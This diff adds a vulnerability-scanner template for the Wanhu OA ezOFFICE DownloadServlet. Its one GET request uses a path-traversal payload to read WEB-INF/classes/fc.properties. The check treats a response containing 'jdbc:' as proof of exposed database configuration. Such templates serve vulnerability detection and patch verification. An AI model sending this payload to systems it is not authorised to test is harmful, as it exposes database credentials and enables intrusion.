@@ -1,0 +1,11 @@
+name: 万户OA-ezOFFICE-DownloadServlet-任意文件读取
+description: >
+  读取数据库配置
+alwaysExecute: false
+matchCount: 1
+rules:
+  - method: GET
+    path: /defaultroot/DownloadServlet?modeType=0&key=x&path=..&FileName=WEB-INF/classes/fc.properties&name=x&encrypt=x&cd=&downloadAll=2
+    expression:
+      status: 200
+      body_all: ["jdbc:"]  
